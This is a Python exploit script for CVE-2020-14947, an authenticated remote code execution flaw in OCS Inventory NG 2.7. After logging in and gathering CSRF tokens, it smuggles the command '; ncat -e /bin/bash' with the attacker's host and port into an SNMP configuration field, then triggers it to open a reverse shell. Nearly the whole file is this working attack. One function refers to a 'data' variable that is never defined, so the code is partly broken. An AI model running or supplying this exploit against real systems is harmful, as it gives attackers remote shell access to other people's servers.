import argparse
import requests
import sys
import base64
import lxml.html
import lxml.etree
from log_colors import *
requests.packages.urllib3.disable_warnings()

# CVE-2020-14947
# OCS Inventory NG v.2.7 authenticated RCE
class CVE2020_14947:
    headers = {"User-Agent" : "Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0"}
    def __init__(self, url, user, passwd, lhost, lport):
        print (LogColors.BLUE + "victim: " + url + "..." + LogColors.ENDC)
        self.url = url.rstrip("/")
        self.user, self.passwd = user, passwd
        self.lhost, self.lport = lhost, lport
        self.session = requests.Session()
    
    # login with creds
    def login(self):
        print (LogColors.BLUE + "login with credentials..." + LogColors.ENDC)
        data = {
            "LOGIN" : self.user,
            "PASSWD" : self.passwd,
            "Valid_CNX" : "Send",
        }
        try:
            r = self.session.post(self.url + "/index.php", data = data)
        except Exception:
            print (LogColors.RED + "failed to login :(" + LogColors.ENDC)
            sys.exit()
        else:
            if "User not registered" in r.text:
                print (LogColors.RED + "failed to login. user not registered :(" + LogColors.ENDC)
                sys.exit()
            else:
                print (LogColors.YELLOW + "successfully login..." + LogColors.ENDC)

    # get first csrf token
    def get_first_csrf_token(self):
        print (LogColors.BLUE + "get first csrf token..." + LogColors.ENDC)
        try:
            r = self.session.get(self.url + "/index.php?function=admin_conf")
        except Exception:
            print (LogColors.RED + "failed parse first token. exit :(" + LogColors.ENDC)
            sys.exit()
        else:
            tree = lxml.html.fromstring(r.text)
            csrf_token = tree.xpath('.//input[@id="CSRF_10"]/@value')
            csrf_token = csrf_token[0]
            print (LogColors.YELLOW + "first token: " + csrf_token + LogColors.ENDC)
            self.first_token = csrf_token

    # get second csrf token
    def get_second_csrf_token(self):
        print (LogColors.BLUE + "get second csrf token..." + LogColors.ENDC)
        data = {
            "CSRF_10" : self.first_token,
            "onglet" : "SNMP",
            "old_onglet" : "INVENTORY"
        }
        try:
            r = self.session.post(self.url + "/index.php?function=admin_conf", data = data)
        except Exception:
            print (LogColors.RED + "failed parse second token. exit :(" + LogColors.ENDC)
            sys.exit()
        else:
            tree = lxml.html.fromstring(r.text)
            csrf_token = tree.xpath('.//input[@id="CSRF_14"]/@value')
            csrf_token = csrf_token[0]
            print (LogColors.YELLOW + "second token: " + csrf_token + LogColors.ENDC)
            self.second_token = csrf_token

    # prepare payload and inject
    def prepare_payload(self):
        print (LogColors.BLUE + "inject payload..." + LogColors.ENDC)
        payload = "; ncat -e /bin/bash {} {} #".format(self.lhost, self.lport)
        data = {
            "CSRF_14": self.second_token,
            "onglet": "SNMP",
            "old_onglet": "SNMP",
            "SNMP": "0",
            "SNMP_INVENTORY_DIFF": "1",
            "SNMP_MIB_DIRECTORY": payload,
            "RELOAD_CONF": "",
            "Valid": "Update"
        }
        print (LogColors.YELLOW + "payload: " + payload + LogColors.ENDC)
        try:
            r = self.session.post(self.url + "/index.php?function=admin_conf", data = data)
        except Exception:
            print (LogColors.RED + "failed inject payload. exit :(" + LogColors.ENDC)
            sys.exit()
        else:
            if "Update done" in r.text:
                print (LogColors.YELLOW + "successfully inject payload :)" + LogColors.ENDC)
            else:
                print (LogColors.RED + "failed inject payload. exit :(" + LogColors.ENDC)
                sys.exit()

    # get third csrf token (after inject payload)
    def get_third_csrf_token(self):
        print (LogColors.BLUE + "get third csrf token..." + LogColors.ENDC)
        try:
            r = self.session.get(self.url + "/index.php?function=SNMP_config", data = data)
        except Exception:
            print (LogColors.RED + "failed parse third token. exit :(" + LogColors.ENDC)
            sys.exit()
        else:
            tree = lxml.html.fromstring(r.text)
            csrf_token = tree.xpath('.//input[@id="CSRF_22"]/@value')
            csrf_token = csrf_token[0]
            print (LogColors.YELLOW + "third token: " + csrf_token + LogColors.ENDC)
            self.third_token = csrf_token
 
    # get fourth csrf token
    def get_fourth_csrf_token(self):
        print (LogColors.BLUE + "get fourth csrf token..." + LogColors.ENDC)
        data = {
            "CSRF_22" : self.third_token,
            "onglet" : 'SNMP_MIB',
            "old_onglet" : 'SNMP_RULE',
            "snmp_config_length" : '10',
        }
        try:
            r = self.session.post(self.url + "/index.php?function=SNMP_config", data = data)
        except Exception:
            print (LogColors.RED + "failed parse second token. exit :(" + LogColors.ENDC)
            sys.exit()
        else:
            tree = lxml.html.fromstring(r.text)
            csrf_token = tree.xpath('.//input[@id="CSRF_26"]/@value')
            csrf_token = csrf_token[0]
            print (LogColors.YELLOW + "fourth token: " + csrf_token + LogColors.ENDC)
            self.fourth_token = csrf_token

    # trigger payload with rev shell
    def trigger_payload(self):
        print (LogColors.BLUE + "trigger payload..." + LogColors.ENDC)
        data = {
            "CSRF_26" : self.fourth_token,
            "onglet" : 'SNMP_MIB',
            "old_onglet" : 'SNMP_MIB',
            "update_snmp" : 'send',
        }
        try:
            r = self.session.post(self.url + "/index.php?function=SNMP_config", data = data)
        except Exception:
            print (LogColors.RED + "failed trigger payload. exit :(" + LogColors.ENDC)
            sys.exit()
        else:
            print (LogColors.GREEN + "successfully trigger payload. hacked :)" + LogColors.ENDC)

    # exploit step by step
    def exploit(self):
        self.login()
        self.get_first_csrf_token()
        self.get_second_csrf_token()
        self.prepare_payload()
        self.get_third_csrf_token()
        self.get_fourth_csrf_token()
        self.trigger_payload()

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-u','--url', required = True, help = "url")
    parser.add_argument('-U','--username', required = True, help = "auth username")
    parser.add_argument('-P','--password', required = True, help = "auth password")
    parser.add_argument('-I','--lhost', required = True, help = "rev shell listener host")
    parser.add_argument('-p','--lport', required = True, help = "rev shell listener port")
    args = vars(parser.parse_args())
    url = args['url']
    user, pswd = args['username'], args['password']
    lhost, lport = args['lhost'], args['lport']
    cve = CVE2020_14947(url, user, pswd, lhost, lport)
    cve.exploit()

